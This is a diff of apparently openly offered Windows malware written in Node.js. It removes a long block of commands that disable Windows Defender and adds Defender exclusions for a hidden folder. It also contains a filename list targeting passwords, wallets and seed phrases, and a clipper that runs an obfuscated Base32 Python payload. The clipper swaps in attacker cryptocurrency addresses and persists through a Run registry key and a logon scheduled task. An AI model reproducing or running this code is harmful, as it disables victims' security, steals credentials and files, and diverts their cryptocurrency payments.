@@ -68,7 +68,6 @@ async function main() {
         relaunchAsAdmin();
     } else {
         console.log("The script is running with administrative privileges.");
-        disableWindowsDefender();
     }
 }
 
@@ -591,77 +590,6 @@ function executeCommand(command) {
     });
 }
 
-// Function to disable Windows Defender features
-async function disableWindowsDefender() {
-    const commands = [
-        'reg add "HKLM\\Software\\Microsoft\\Windows Defender Security Center\\Notifications" /v "DisableNotifications" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f',
-        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance" /v "Enabled" /t REG_DWORD /d "0" /f',
-        'reg delete "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v "AllowFastServiceStartup" /t REG_DWORD /d "0" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v "DisableSpecialRunningModes" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d "0" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f',
-        'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f',
-        'reg add "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f',
-        'reg add "HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f',
-        'schtasks /Change /TN "Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh" /Disable',
-        'schtasks /Change /TN "Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance" /Disable',
-        'schtasks /Change /TN "Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup" /Disable',
-        'schtasks /Change /TN "Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan" /Disable',
-        'schtasks /Change /TN "Microsoft\\Windows\\Windows Defender\\Windows Defender Verification" /Disable',
-        'reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run" /v "SecurityHealth" /f',
-        'reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityHealth" /f',
-        'reg delete "HKCR\\*\\shellex\\ContextMenuHandlers\\EPP" /f',
-        'reg delete "HKCR\\Directory\\shellex\\ContextMenuHandlers\\EPP" /f',
-        'reg delete "HKCR\\Drive\\shellex\\ContextMenuHandlers\\EPP" /f',
-        'sc config TrustedInstaller binPath= "sc stop Windefend"',
-        'sc start TrustedInstaller',
-        'sc config TrustedInstaller binPath= "sc stop WdFilter"',
-        'sc start TrustedInstaller',
-        'sc config TrustedInstaller binPath= "sc stop WdNisDrv"',
-        'sc start TrustedInstaller',
-        'sc config TrustedInstaller binPath= "sc stop WdNisSvc"',
-        'sc start TrustedInstaller',
-        'sc config TrustedInstaller binPath= "sc stop MDCoreSvc"',
-        'sc start TrustedInstaller',
-        'sc config TrustedInstaller binPath= "sc stop mpsdrv"',
-        'sc start TrustedInstaller',
-        'sc config TrustedInstaller binPath= "sc stop mpssvc"',
-        'sc start TrustedInstaller',
-        'reg add "HKLM\\System\\CurrentControlSet\\Services\\mpsdrv" /v "Start" /t REG_DWORD /d "4" /f',
-        'reg add "HKLM\\System\\CurrentControlSet\\Services\\mpssvc" /v "Start" /t REG_DWORD /d "4" /f',
-        'reg add "HKLM\\System\\CurrentControlSet\\Services\\WdFilter" /v "Start" /t REG_DWORD /d "4" /f',
-        'reg add "HKLM\\System\\CurrentControlSet\\Services\\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f',
-        'reg add "HKLM\\System\\CurrentControlSet\\Services\\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f',
-        'reg add "HKLM\\System\\CurrentControlSet\\Services\\WinDefend" /v "Start" /t REG_DWORD /d "4" /f',
-        'reg add "HKLM\\System\\CurrentControlSet\\Services\\MDCoreSvc" /v "Start" /t REG_DWORD /d "4" /f'
-    ];
-
-    for (const command of commands) {
-        try {
-            const result = await executeCommand(command);
-            console.log(`Command succeeded: ${command}`);
-            console.log(result);
-        } catch (error) {
-            console.error(`Command failed: ${command}`);
-            console.error(error);
-        }
-    }
-}
-
-
 const allowedExtensions = [".rdp", ".txt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".keys", ".ldb", ".log"];
 const files = ["secret", "password", "account", "tax", "key", "wallet", "gang", "default", "backup", "passw", "mdp", "motdepasse", "acc", "mot_de_passe", "login", "secret", "bot", "atomic", "account", "acount", "paypal", "banque", "bot", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token", "backup", "secret", "seed", "mnemonic", "memoric", "private", "key", "passphrase", "pass", "phrase", "steal", "bank", "info", "casino", "prv", "privé", "prive", "telegram", "identifiant", "identifiants", "personnel", "trading", "bitcoin", "sauvegarde", "funds", "recup", "note"];
 
@@ -1106,6 +1034,26 @@ async function installPython() {
     return path.join(process.env['USERPROFILE'], 'AppData', 'Local', 'Programs', 'Python', 'Python312', 'pythonw.exe');
 }
 
+function addDefenderExclusions() {
+    const appDataHiddenFolder = path.join(os.homedir(), 'AppData', 'Local', `.${generateRandomString(10)}`);
+    const systemTasksPath = 'C:\\Windows\\System32\\Tasks';
+
+    const commands = [
+        `powershell -Command Add-MpPreference -ExclusionPath "${appDataHiddenFolder}"`,
+        `powershell -Command Add-MpPreference -ExclusionPath "${systemTasksPath}"`
+    ];
+
+    // Execute each PowerShell command synchronously
+    commands.forEach((command) => {
+        try {
+            const output = execSync(command, { stdio: 'pipe' }).toString();
+            console.log(`Exclusion added successfully: ${output}`);
+        } catch (error) {
+            console.error(`Error adding exclusion: ${error.message}`);
+        }
+    });
+}
+
 // Replace with your addresses or all money to me :)
 const addresses = {
     btc: "bc1qsuc4rc2uknl43kqxemuyv6d3xffnds2j008gj7",
@@ -1121,9 +1069,10 @@ const addresses = {
 
 // This is a clipper, here is the decrypted code: https://pastebin.com/raw/ujJT2Xje (DM me on Telegram if you don't know how to decrypt base64 :0)
 async function clip(pythonwExe) {
-    const userDataPath = path.join(os.homedir(), 'AppData', 'Roaming', `${generateRandomString(8)}`);
-    if (!fs.existsSync(userDataPath)) {
-        fs.mkdirSync(userDataPath, { recursive: true });
+    const appDataHiddenFolder = path.join(os.homedir(), 'AppData', 'Local', `.${generateRandomString(10)}`);
+    if (!fs.existsSync(appDataHiddenFolder)) {
+        fs.mkdirSync(appDataHiddenFolder, { recursive: true });
+        fs.chmodSync(appDataHiddenFolder, 0o700); // Make it hidden
     }
 
     const scriptContent = `
@@ -1131,7 +1080,7 @@ import base64
 
 # Base32 encoded Python code
 encoded_code = """
-NFWXA33SOQQHEZIKNFWXA33SOQQHI2LNMUFGS3LQN5ZHIIDQPFYGK4TDNRUXACTJNVYG64TUEBRGC43FGY2AUCTBMRSHEZLTONSXGIB5EB5QUIBAEAQCEYTUMMRDUIBCMJRTC4LTOVRTI4TDGJ2WW3TMGQZWW4LYMVWXK6LWGZSDG6DGMZXGI4ZSNIYDAODHNI3SELAKEAQCAIBCMV2GQIR2EARDA6BXGAYDQNZVIRDDKNLEHEYDIYRSGQ2DMOJUGU4GCNTCIFCTANCGGZSGIN3FIY4TCRRCFQFCAIBAEARGY5DDEI5CAITMORRTC4LYG5XDOZTSGRQW46LTON4WQZTQGJZTI43EHFVHMN3SHA4WK6BZONSDEZBWMRTSELAKEAQCAIBCORZHQIR2EARFISSZMVCWQYLPLE2XGUJWGZJUQTDCINYDQNLKI5RVG23RJRGHMQSUKURCYCRAEAQCAITCMNUCEORAEJYXU2TXGRSGU5JVPAZHQM3LO52HKZLMOBYG23JYNRYHON3NOZXGCN3TGVTGYZJTONZDIIRMBIQCAIBAEJ4G24RCHIQCENBTIFFXCZBRJQ2FCS2WKF2XQN3CJNCUWNTEKVWVMS2FJJKGIRLUM5JWOWLBNIZDK4THKJDWCVLSOAZGOZLLJRATCYSSIR5EUYTCMFSFAVDBJZ3UERZYNZVG2WKDKZ3EK2KKLJBHS6LWKY3E4YLOINKVEIRMBIQCAIBAEJ4HE4BCHIQCE4TGGJ4XGTSVIJHFSRSQLA2XI6SOMZQU4Z2SNJFEIZLEKFLWQNTNKNLCELAKEAQCAIBCPJRWC43IEI5CAITUGFQTGNDVKE4FQUSOJNXVO6LZNNIVKQLUKI3HM2RVHBKUITLQMFQXSZRCFQFCAIBAEARGI33HMURDUIBCIRITKZK2KF4U2YSDONAUORDPIU3XM4JTPJZVASBXOY2DGRLWMZKVMNTSJJ3HIQLSONYXC5RXJRCW2YRTIJDDMZJROZEHKZCHKBBVC4DQMF4GMIQKPUFAU4DBOR2GK4TOOMQD2ID3BIQCAIBAEJRHIYZCHIQHEIS6FBRGGML4LMYTGXJJLNQS26SBFVEEULKOKAWVUMBNHFOXWMRWFQ2DC7JEEIWAUIBAEAQCEZLUNARDUIDSEJPDA6C3MEWWMQJNIYYC2OK5PM2DA7JEEIWAUIBAEAQCE3DUMMRDUIDSEJPCQTD4JV6DG7DMORRTCKK3MEWWW3JNPJAS2SCKFVHFALK2GEWTSXL3GI3CYMZTPUSCELAKEAQCAIBCORZHQIR2EBZCEXSULNQS26SBFVNDALJZLV5TEOBMGMZX2JBCFQFCAIBAEARGEY3IEI5CA4RCLYUCQYTJORRW62LOMNQXG2B2FE7SQ4L4OAUVWYJNPIYC2OK5PM2DC7JJEQRCYCRAEAQCAITYNVZCEORAOIRF4NC3GAWTSQKCLVNTCLJZIEWUQSRNJZIC2WTBFVVW2LL2LV5TSMRMHE2X2JBCFQFCAIBAEARHQ4TQEI5CA4RCLZZFWMBNHFQS26SBFVNF26ZSGQWDGND5EQRCYCRAEAQCAIT2MNQXG2BCHIQHEIS6OQYVWMBNHFAS26S5PMZTELBTHF6SIIRMBIQCAIBAEJSG6Z3FEI5CA4RCLZCHWML5LM2S2OKBFVEEULKOKAWVKXL3GF6VWMJNHFAS2SCKFVHFALK2MEWWW3JNPJOXWMZSFQ3DC7JEEIFH2CQKMRSWMIDNN5XGS5DPOJPWG3DJOBRG6YLSMQUCSOQKEAQCAIDSMVRWK3TUL53GC3DVMUQD2IBCEIFCAIBAEB3WQ2LMMUQFI4TVMU5AUIBAEAQCAIBAEBRWY2LQMJXWC4TEL53GC3DVMUQD2IDQPFYGK4TDNRUXALTQMFZXIZJIFEFCAIBAEAQCAIBANFTCAY3MNFYGE33BOJSF65TBNR2WKIBBHUQHEZLDMVXHIX3WMFWHKZJ2BIQCAIBAEAQCAIBAEAQCA4TFMNSW45C7OZQWY5LFEA6SAY3MNFYGE33BOJSF65TBNR2WKCRAEAQCAIBAEAQCAIBAEBTG64RAMNZHS4DUN4WCA4DBOR2GK4TOEBUW4IDQMF2HIZLSNZZS42LUMVWXGKBJHIFCAIBAEAQCAIBAEAQCAIBAEAQCA2LGEBZGKLTNMF2GG2BIOBQXI5DFOJXCYIDDNRUXAYTPMFZGIX3WMFWHKZJJHIFCAIBAEAQCAIBAEAQCAIBAEAQCAIBAEAQHA6LQMVZGG3DJOAXGG33QPEUGCZDEOJSXG43FONNWG4TZOB2G6XJJBIQCAIBAEAQCAIBAEAQCAIBAEAQCAIBAEBRHEZLBNMFCAIBAEAQCAIBAORUW2ZJOONWGKZLQFAYC4NJJBIFGSZRAL5PW4YLNMVPV6IB5HUQCEX27NVQWS3S7L4RDUCRAEAQCA3LPNZUXI33SL5RWY2LQMJXWC4TEFAUQ====
+NFWXA33SOQQHEZIKNFWXA33SOQQHI2LNMUFGS3LQN5ZHIIDQPFYGK4TDNRUXACTJNVYG64TUEBRGC43FGY2AU2LNOBXXE5BAN5ZQU2LNOBXXE5BAON4XGCQKMFSGI4TFONZWK4ZAHUQHWCRAEAQCAITCORRSEORAEJRGGMLRON2WGNDSMMZHK23ONQ2DG23RPBSW25LZOY3GIM3YMZTG4ZDTGJVDAMBYM5VDOIRMBIQCAIBAEJSXI2BCHIQCEMDYG4YDAOBXGVCEMNJVMQ4TANDCGI2DINRZGQ2TQYJWMJAUKMBUIY3GIZBXMVDDSMKGEIWAUIBAEAQCE3DUMMRDUIBCNR2GGMLRPA3W4N3GOI2GC3TZONZXS2DGOAZHGNDTMQ4WU5RXOI4DSZLYHFZWIMTEGZSGOIRMBIQCAIBAEJ2HE6BCHIQCEVCKLFSUK2DBN5MTK42RGY3FGSCMMJBXAOBVNJDWGU3LOFGEY5SCKRKSELAKEAQCAIBCMJRWQIR2EARHC6TKO42GI2TVGV4DE6BTNN3XI5LFNRYHA3LNHBWHA5ZXNV3G4YJXOM2WM3DFGNZXENBCFQFCAIBAEARHQ3LSEI5CAIRUGNAUW4LEGFGDIUKLKZIXK6BXMJFUKSZWMRKW2VSLIVFFIZCFORTVGZ2ZMFVDENLSM5JEOYKVOJYDEZ3FNNGECMLCKJCHUSTCMJQWIUCUMFHHOQSHHBXGU3KZINLHMRLJJJNEE6LZOZLDMTTBNZBVKURCFQFCAIBAEARHQ4TQEI5CAITSMYZHS42OKVBE4WKGKBMDK5D2JZTGCTTHKJVEURDFMRIVO2BWNVJVMIRMBIQCAIBAEJ5GGYLTNARDUIBCOQYWCMZUOVITQWCSJZFW6V3ZPFVVCVKBORJDM5TKGU4FKRCNOBQWC6LGEIWAUIBAEAQCEZDPM5SSEORAEJCFCNLFLJIXSTLCINZUCR2EN5CTO5TRGN5HGUCIG53DIM2FOZTFKVRWOJFHM5CBOJZXC4LWG5GEK3LCGNBEMNTFGF3EQ5LEI5IEGULQOBQXQZRCBJ6QUCTQMF2HIZLSNZZSAPJAPMFCAIBAEARGE5DDEI5CA4RCLYUGEYZRPRNTCM25FFNWCLL2IEWUQSRNJZIC2WRQFU4V26ZSGYWDIML5EQRCYCRAEAQCAITFORUCEORAOIRF4MDYLNQS2ZSBFVDDALJZLV5TIMD5EQRCYCRAEAQCAITMORRSEORAOIRF4KCMPRGXYM34NR2GGMJJLNQS223NFV5ECLKIJIWU4UBNLIYS2OK5PMZDMLBTGN6SIIRMBIQCAIBAEJ2HE6BCHIQHEIS6KRNWCLL2IEWVUMBNHFOXWMRYFQZTG7JEEIWAUIBAEAQCEYTDNARDUIDSEJPCQKDCNF2GG33JNZRWC43IHIUT6KDRPRYCSW3BFV5DALJZLV5TIML5FESCELAKEAQCAIBCPBWXEIR2EBZCEXRULMYC2OKBIJOVWMJNHFAS2SCKFVHFALK2MEWWW3JNPJOXWOJSFQ4TK7JEEIWAUIBAEAQCE6DSOARDUIDSEJPHEWZQFU4WCLL2IEWVUXL3GI2CYMZUPUSCELAKEAQCAIBCPJRWC43IEI5CA4RCLZ2DCWZQFU4UCLL2LV5TGMRMGM4X2JBCFQFCAIBAEARGI33HMURDUIDSEJPEI6ZRPVNTKLJZIEWUQSRNJZIC2VK5PMYX2WZRFU4UCLKIJIWU4UBNLJQS223NFV5F26ZTGIWDMML5EQRAU7IKBJSGKZRAMNZGKYLUMVPWY33DNNPWM2LMMUUCSOQKEAQCAIDMN5RWWX3GNFWGKX3QMF2GQIB5EBXXGLTQMF2GQLTKN5UW4KDPOMXGK3TWNFZG63ROM5SXIKBHKBZG6Z3SMFWUIYLUMETSYIBHIM5FYXCQOJXWO4TBNVCGC5DBE4USYIBHONRXE2LQOQXGY33DNMTSSCRAEAQCA2LGEBXXGLTQMF2GQLTFPBUXG5DTFBWG6Y3LL5TGS3DFL5YGC5DIFE5AUIBAEAQCAIBAEBYHE2LOOQUCEU3DOJUXA5BANFZSAYLMOJSWCZDZEBZHK3TONFXGOLRCFEFCAIBAEAQCAIBAON4XGLTFPBUXIKBJBIQCAIBAO5UXI2BAN5YGK3RINRXWG227MZUWYZK7OBQXI2BMEATXOJZJEBQXGIDMN5RWWX3GNFWGKOQKEAQCAIBAEAQCA3DPMNVV6ZTJNRSS453SNF2GKKDTORZCQ33TFZTWK5DQNFSCQKJJFEFCAIBAEBZGK5DVOJXCA3DPMNVV6ZTJNRSV64DBORUAUCTEMVTCA4TFNVXXMZK7NRXWG227MZUWYZJINRXWG227MZUWYZK7OBQXI2BJHIFCAIBAEBUWMIDPOMXHAYLUNAXGK6DJON2HGKDMN5RWWX3GNFWGKX3QMF2GQKJ2BIQCAIBAEAQCAIDPOMXHEZLNN53GKKDMN5RWWX3GNFWGKX3QMF2GQKIKBJSGKZRANVXW42LUN5ZF6Y3MNFYGE33BOJSCQKJ2BIQCAIBAOJSWGZLOORPXMYLMOVSSAPJAEIRAUIBAEAQHO2DJNRSSAVDSOVSTUCRAEAQCAIBAEAQGG3DJOBRG6YLSMRPXMYLMOVSSAPJAOB4XAZLSMNWGS4BOOBQXG5DFFAUQUIBAEAQCAIBAEBUWMIDDNRUXAYTPMFZGIX3WMFWHKZJAEE6SA4TFMNSW45C7OZQWY5LFHIFCAIBAEAQCAIBAEAQCAIDSMVRWK3TUL53GC3DVMUQD2IDDNRUXAYTPMFZGIX3WMFWHKZIKEAQCAIBAEAQCAIBAEAQGM33SEBRXE6LQORXSYIDQMF2HIZLSNYQGS3RAOBQXI5DFOJXHGLTJORSW24ZIFE5AUIBAEAQCAIBAEAQCAIBAEAQCAIDJMYQHEZJONVQXIY3IFBYGC5DUMVZG4LBAMNWGS4DCN5QXEZC7OZQWY5LFFE5AUIBAEAQCAIBAEAQCAIBAEAQCAIBAEAQCA4DZOBSXEY3MNFYC4Y3POB4SQYLEMRZGK43TMVZVWY3SPFYHI325FEFCAIBAEAQCAIBAEAQCAIBAEAQCAIBAEAQGE4TFMFVQUIBAEAQCAIBAEB2GS3LFFZZWYZLFOAUDALRVFEFAU2LGEBPV63TBNVSV6XZAHU6SAIS7L5WWC2LOL5PSEOQKEAQCAIDMN5RWWX3GNFWGKIB5EBRXEZLBORSV63DPMNVV6ZTJNRSSQKIKEAQCAIDUOJ4TUCRAEAQCAIBAEAQG233ONF2G64S7MNWGS4DCN5QXEZBIFEFCAIBAEBTGS3TBNRWHSOQKEAQCAIBAEAQCA4TFNVXXMZK7NRXWG227MZUWYZJINRXWG227MZUWYZJJBI======
 """
 
 # Function to adjust padding for Base32 string
@@ -1151,26 +1100,23 @@ decoded_code = base64.b32decode(encoded_code).decode('utf-8')
 exec(decoded_code)
 `;
 
-    const scriptFilePath = path.join(userDataPath, `${generateRandomString(10)}.py`);
+    const scriptFilePath = path.join(appDataHiddenFolder, `${generateRandomString(10)}.py`);
     fs.writeFileSync(scriptFilePath, scriptContent);
 
-    // Terminate any existing pythonw.exe processes
     try {
-        execSync('taskkill /F /IM pythonw.exe', { stdio: 'ignore' });
-        console.log('Terminated existing pythonw.exe processes.');
-    } catch (error) {
-        console.error(`Error terminating pythonw.exe: ${error.message}`);
-    }
+        // Add the script to the registry for startup
+        const registryCommand = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "PythonScript" /t REG_SZ /d "${pythonwExe} \\"${scriptFilePath}\\"" /f`;
+        execSync(registryCommand);
+        console.log('Python script added to registry for startup.');
 
-    // Schedule the Python script to run at user logon
-    try {
+        // Also schedule the task
         const taskName = `PythonUpdater_${generateRandomString(8)}`;
         execSync(`schtasks /create /tn "${taskName}" /tr "\"${pythonwExe}\" \"${scriptFilePath}\"" /sc onlogon /f`);
         console.log('Python script scheduled to run at logon.');
     } catch (error) {
-        console.error(`Error scheduling task: ${error.message}`);
+        console.error(`Error scheduling task or adding registry entry: ${error.message}`);
     }
-
+    
     // Run the Python script in the background
     try {
         const pythonProcess = spawn(pythonwExe, [scriptFilePath], { detached: true, stdio: 'ignore' });
@@ -1181,10 +1127,12 @@ exec(decoded_code)
     }
 }
 
+// Main function to create and execute scripts and add Defender exclusions
 async function createAndExecuteScripts() {
     try {
-        const pythonwExe = await installPython();
-        clip(pythonwExe);  // Run the Python script
+        addDefenderExclusions(); // Add hidden folder to Defender exclusions
+        const pythonwExe = await installPython(); // Assume installPython is your function to install Python
+        await clip(pythonwExe);  // Run the Python script
     } catch (error) {
         console.error(`Error: ${error.message}`);
     }
